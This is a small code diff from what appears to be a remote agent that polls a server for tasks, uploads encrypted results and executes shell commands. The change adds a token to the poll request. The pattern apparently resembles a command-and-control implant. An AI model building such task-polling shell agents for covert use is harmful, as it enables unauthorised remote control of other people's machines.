@@ -219,9 +219,9 @@ def send_result(data):
     return api(f"{SERVER}/api/tasks/{AID}", {"cipher": encrypt(json.dumps(data))})
 
 def poll():
-    r = api(f"{SERVER}/api/tasks/{AID}")
+    r = api(f"{SERVER}/api/tasks/{AID}?token={TOKEN}")
     if r:
-        return r.get("tasks", []), r.get("interval", 5), r.get("known", True)
+        return r.get("tasks", []), r.get("interval", 5), True
     return [], 5, False
 
 def exec_shell(cmd):
